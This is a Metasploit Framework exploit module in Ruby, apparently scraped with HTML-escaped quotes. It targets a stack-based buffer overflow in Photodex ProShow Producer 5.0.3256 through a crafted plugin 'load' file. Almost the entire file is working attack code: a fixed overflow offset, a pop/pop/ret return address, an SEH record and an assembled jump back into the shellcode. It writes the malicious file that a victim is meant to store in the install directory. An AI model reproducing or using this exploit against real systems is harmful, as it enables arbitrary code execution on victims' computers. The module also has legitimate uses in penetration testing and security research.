# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
    include Msf::Auxiliary::Report
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Photodex ProShow Producer 5.0.3256 load File Handling Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in Photodex ProShow Producer
                v5.0.3256 in the handling of the plugins load list file. An attacker must send the
                crafted "load" file to victim, who must store it in the installation directory. The
                vulnerability will be triggered the next time ProShow is opened. The module has been
                tested successfully on Windows XP SP3 and Windows 7 SP1.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [
                &#039;Julien Ahrens&#039;, # Vulnerability discovery and PoC
                &#039;mr.pr0n&#039;, # Additional PoC
                &#039;juan&#039;, # Metasploit module
            ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;83745&#039; ],
                    [ &#039;EDB&#039;, &#039;19563&#039; ],
                    [ &#039;EDB&#039;, &#039;20036&#039; ],
                    [ &#039;URL&#039;, &#039;http://security.inshell.net/advisory/30&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 9844,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Photodex ProShow Producer 5.0.3256 / Windows XP SP3 / Windows 7 SP1&#039;,
                        {
                            &#039;Offset&#039; => 9844,
                            &#039;Ret&#039; => 0x1022A959 # p/p/r from if.dnt
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Jun 06 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;load&#039;]),
            ], self.class)
    end
 
    # Overriding file_create to allow the creation of a file without extension
    def file_create(data)
 
        fname = datastore[&#039;FILENAME&#039;]
        ltype = "exploit.fileformat.#{self.shortname}"
 
        if ! ::File.directory?(Msf::Config.local_directory)
            FileUtils.mkdir_p(Msf::Config.local_directory)
        end
 
        path = File.join(Msf::Config.local_directory, fname)
        full_path = ::File.expand_path(path)
        File.open(full_path, "wb") { |fd| fd.write(data) }
 
        report_note(:data => full_path.dup, :type => "#{ltype}.localpath")
 
        print_good "#{fname} stored at #{full_path}"
 
    end
 
    def exploit
 
        sploit = payload.encoded
        sploit << generate_seh_record(target.ret)
        # jmp back to the payload
        sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{target[&#039;Offset&#039;]+8}").encode_string
        # cause exception hitting the end of the stack
        sploit << rand_text(300)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(sploit)
 
    end
 
end



